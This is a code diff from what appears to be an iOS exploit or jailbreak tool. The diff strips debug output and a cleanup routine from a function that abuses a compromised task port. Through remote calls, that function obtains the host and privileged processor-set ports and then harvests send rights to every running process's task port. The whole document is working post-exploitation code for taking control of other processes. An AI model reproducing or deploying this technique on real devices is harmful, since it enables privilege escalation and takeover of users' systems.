@@ -50,21 +50,6 @@ find_task_port_for_pid(pid_t pid)
   return MACH_PORT_NULL;
 }
 
-void
-drop_all_task_ports() {
-  struct task_port_list_entry* entry = all_task_ports;
-  
-  while(entry != NULL){
-    struct task_port_list_entry* next = entry->next;
-    
-    free(entry->path);
-    mach_port_deallocate(mach_task_self(), entry->port);
-    free(entry);
-    
-    entry = next;
-  }
-}
-
 // not in iOS SDK:
 extern int proc_pidpath(int pid, void * buffer, uint32_t buffersize);
 
@@ -77,27 +62,19 @@ get_task_ports(mach_port_t task_port)
   // get the remote host port:
   mach_port_t remote_host_port_name = MACH_PORT_NULL;
   err = (int) call_remote(task_port, task_get_special_port, 3, REMOTE_LITERAL(0x103), REMOTE_LITERAL(TASK_HOST_PORT), REMOTE_OUT_BUFFER(&remote_host_port_name, sizeof(remote_host_port_name)) );
-//  printf("remote task_get_special port (TASK_HOST_PORT) returned %x\n", err);
-//  printf("remote host port name is: %x\n", remote_host_port_name);
     
   // get the default processor set port:
   mach_port_t remote_default_processor_set_port_name = MACH_PORT_NULL;
   err = (int) call_remote(task_port, processor_set_default, 2, REMOTE_LITERAL(remote_host_port_name), REMOTE_OUT_BUFFER(&remote_default_processor_set_port_name, sizeof(remote_default_processor_set_port_name)) );
-//  printf("remote processor_set_default returned %x\n", err);
-//  printf("remote default processor set name is: %x\n", remote_default_processor_set_port_name);
     
   // get the priv port:
   mach_port_t ps_control = MACH_PORT_NULL;
   err = (int) call_remote(task_port, host_processor_set_priv, 3, REMOTE_LITERAL(remote_host_port_name), REMOTE_LITERAL(remote_default_processor_set_port_name), REMOTE_OUT_BUFFER(&ps_control, sizeof(ps_control)));
-//  printf("remote host_processor_set_priv returned %d\n", err);
-//  printf("remote ps_control port: %x\n", ps_control);
     
   // get the processor set tasks
   mach_port_t* task_ports = NULL;
   mach_msg_type_number_t task_portsCnt = 0;
   err = (int) call_remote(task_port, processor_set_tasks, 3, REMOTE_LITERAL(ps_control), REMOTE_OUT_BUFFER(&task_ports, sizeof(task_ports)), REMOTE_OUT_BUFFER(&task_portsCnt, sizeof(task_portsCnt)));
-//  printf("remote processor_set_tasks returned: %d\n", err);
-//  printf("remote processor_set_tasks: task_ports: %p task_portsCnt: %d\n", task_ports, task_portsCnt);
     
   // get those port names:
   // (should also vm_deallocate the remote buffer)
@@ -109,16 +86,15 @@ get_task_ports(mach_port_t task_port)
   uint64_t remote_path_buffer = remote_alloc(task_port, remote_path_buffer_size);
   
   char* local_path_buffer = malloc(remote_path_buffer_size);
-  
+    
   // pull the send rights into this processes
   struct task_port_list_entry* port_list_head = NULL;
   
   for (int i = 0; i < task_portsCnt; i++){
+      
     mach_port_t remote_name = actual_task_port_names[i];
     mach_port_t local_name = pull_remote_port(task_port, remote_name, MACH_MSG_TYPE_COPY_SEND);
     actual_task_port_names[i] = local_name;
-    
-//    printf("copied remote task port right %x to local port %x\n", remote_name, local_name);
       
     pid_t task_pid = 0;
     err = pid_for_task(local_name, &task_pid);
@@ -126,13 +102,10 @@ get_task_ports(mach_port_t task_port)
       printf("pid_for_task failed on pulled task port %x\n", local_name);
       continue;
     }
-    
-//      printf("[INFO]: got task port for pid %d\n", task_pid);
       
     // call the libproc function remotely to get the path for that pid:
     err = (int) call_remote(task_port, proc_pidpath, 3, REMOTE_LITERAL(task_pid), REMOTE_LITERAL(remote_path_buffer), REMOTE_LITERAL(remote_path_buffer_size));
-    if (err == 0){
-//      printf("remote proc_pidpath failed: %x\n", err);
+    if (err == 0) {
       continue;
     }
     
@@ -140,11 +113,7 @@ get_task_ports(mach_port_t task_port)
     remote_read_overwrite(task_port, remote_path_buffer, (uint64_t)local_path_buffer, remote_path_buffer_size);
     
     printf("[INFO] %s - pid: %d\n", local_path_buffer, task_pid);
-    
-    // test that it really, really is the task port and try to execute something in the context of that task:
-    //uid_t remote_uid = (uid_t) call_remote(local_name, getuid, 0);
-    //printf("remote uid: %d\n", remote_uid);
-    
+      
     struct task_port_list_entry* port_list_entry = malloc(sizeof(struct task_port_list_entry));
     port_list_entry->next = port_list_head;
     port_list_entry->port = local_name;
